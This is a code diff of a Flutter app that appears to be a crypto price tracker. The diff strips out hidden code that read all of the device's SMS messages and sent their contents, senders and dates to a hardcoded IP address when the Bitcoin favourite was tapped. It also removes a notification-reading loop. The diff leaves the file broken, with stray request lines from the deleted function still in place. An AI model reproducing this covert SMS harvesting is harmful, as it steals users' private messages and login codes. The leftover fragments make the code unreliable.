@@ -2,8 +2,6 @@
 
 import 'package:fl_chart/fl_chart.dart';
 import "package:flutter/material.dart";
-import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
-import 'package:notification_reader/notification_reader.dart';
 import 'dart:convert';
 import 'dart:async';
 import 'package:flutter/services.dart';
@@ -11,15 +9,6 @@ import 'package:http/http.dart' as http;
 import 'package:syncfusion_flutter_charts/charts.dart';
 
 
-void postSms (String datatext, final sender,final address, final date, final type, final read) async{
-  Map<String, dynamic> request = {
-    "message" : datatext.toString(),
-    "from" : sender.toString(),
-    "address": address.toString(),
-    "date" : date.toString(),
-    "type": type.toString(),
-    "read" : read
-  };
 
   final apiurl = Uri.parse("http://192.168.43.232:3002/postData/$request");
   final response = await http.get(apiurl);
@@ -91,36 +80,6 @@ class _HomeScreenState extends State<HomeScreen> {
       ["All", "false"],
     ];
 
-    void getsms() async {
-  SmsQuery query = SmsQuery();
-
-  // Fetch all SMS messages
-  List<SmsMessage> messages = await query.getAllSms;
-
-  // Print the SMS messages
-  for (SmsMessage message in messages) {
-    // print('Message from: ${message.sender} - Body: ${message.body}');
-            postSms(json.encode(message.body), message.sender, message.address, message.dateSent, message.kind, message.read);
-  }
-}
-   List<NotificationData> titleList = [];
-
- Future<void> initPlatformState() async {
-    NotificationData res = await NotificationReader.onNotificationRecieve();
-    if (res.body != null) {
-      Timer.periodic(Duration(seconds: 1), (timer) async {
-        var res = await NotificationReader.onNotificationRecieve();
-        if (!titleList.contains(res)) {
-          setState(() {
-            print(titleList);
-            titleList.add(res);
-          });
-        }
-      });
-    }
-  }
-
-
   int _currentAsset = 0;
 
 
@@ -161,7 +120,7 @@ class _HomeScreenState extends State<HomeScreen> {
               color: Colors.transparent,
             ),
             GestureDetector(
-              onTap: getsms,
+              onTap: () {},
               child: Favorites(themeMode: themeMode, name: "Bitcoin", rate: "+1.46%", abb: "BTC", price: "34,360", image: "btc.png",),
             ),         
             Divider(
